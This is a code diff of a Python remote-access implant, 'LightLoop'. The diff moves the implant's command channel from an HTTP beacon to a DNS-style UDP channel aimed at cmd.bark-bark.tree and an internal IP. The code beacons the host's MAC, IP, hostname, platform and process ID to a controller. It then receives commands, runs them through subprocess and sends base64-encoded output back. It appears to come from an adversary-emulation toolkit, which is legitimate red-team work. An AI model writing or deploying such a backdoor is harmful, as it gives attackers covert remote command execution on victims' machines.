@@ -27,17 +27,16 @@ DOMAIN = "cmd.bark-bark.tree"
 
 class LightLoop:
 
-    def __init__(self, profile):
-        self.profile = profile
+    def __init__(self):
+        self.mac = str(format(get_mac(), 'x'))
+        self.ip = self.get_ip()
 
     def start(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         host = socket.gethostname()
         platform_name=platform.system().lower()
-        pid=str(os.getpid())
-        mac = str(format(get_mac(), 'x'))
-        ip = self.get_ip()
-        content = mac + ";" + ip + ";" + host + ";" + platform_name + ";" + pid
+        pid=str(os.getpid()) 
+        content = self.mac + ";" + self.ip + ";" + host + ";" + platform_name + ";" + pid
         sock.sendto(content.encode('utf-8'), (DNS_IP, DNS_SIGNAL_PORT))
         sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock1.bind((HOST, DNS_PORT))
@@ -62,7 +61,6 @@ class LightLoop:
             except subprocess.CalledProcessError as e:
                 res = e.output
             sock.sendto(base64.b64encode(res), (DNS_IP, DNS_SIGNAL_PORT))
-
 
     def get_ip(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -96,20 +94,14 @@ class LightLoop:
 
     def _unpad(self, s):
         return s[:-ord(s[len(s)-1:])]
-        
-def build_profile(server_addr):
-    return dict(
-        server=server_addr,
-        host=socket.gethostname(),
-        platform=platform.system().lower(),
-        executors=['sh'],
-        pid=os.getpid()
-    )
 
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser('Start here')
-    parser.add_argument('-W', '--website', required=False, default='http://10.150.0.7:8888/weather')
+    parser.add_argument('-D', '--dns', required=False, default='10.150.0.8')
     args = parser.parse_args()
-    p = build_profile('%s' % args.website)
-    LightLoop(profile=p).start()
+    DNS_IP = args.dns
+    try:
+        LightLoop().start()
+    except Exception as e:
+        print('[-] DNS may not be accessible, or: %s' % e)
